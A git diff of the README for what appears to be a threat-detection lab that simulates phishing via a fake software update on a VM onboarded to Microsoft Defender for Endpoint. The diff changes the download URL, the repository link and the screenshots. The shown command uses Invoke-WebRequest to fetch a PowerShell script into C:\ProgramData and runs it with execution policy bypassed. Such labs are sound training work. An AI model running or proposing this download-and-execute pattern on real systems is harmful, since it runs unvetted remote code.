@@ -18,16 +18,15 @@
 📥 **The PowerShell Payload**
 Run the PowerShell command below on your VM **after onboarding it to MDE**:
 ```powershell
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\programdata\phishingFakeSoftwareUpdate.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\phishingFakeSoftwareUpdate.ps1
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shanerwilson/code-nine/refs/heads/main/Cybersecurity%20test%20scripts/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\ProgramData\phishingFakeSoftwareUpdate.ps1'; powershell.exe -ExecutionPolicy Bypass -File 'C:\ProgramData\phishingFakeSoftwareUpdate.ps1'
 ```
 
-https://github.com/TrevinoParker7/Powershell-test-payload-harmless/blob/main/phishingFakeSoftwareUpdate.ps1
+https://github.com/shanerwilson/code-nine/blob/main/Cybersecurity%20test%20scripts/phishingFakeSoftwareUpdate.ps1
 
 ---
 
-![Screenshot 2025-01-26 181108](https://github.com/user-attachments/assets/7b9ccc9f-e290-4125-8990-2e2de03d2d45)
+![2025-04-01 23_46_47-Phishing-via-Fake-Software-Update_README md at main · shanerwilson_Phishing-via-](https://github.com/user-attachments/assets/dbc614a8-8018-420f-8c6f-a64fd082004f)
 
-![Screenshot 2025-01-26 130233](https://github.com/user-attachments/assets/e154a3c3-0a2f-4748-91af-0cc28bfa73a0)
 
 ---
 ### 💻 **Platforms and Tools Leveraged**  
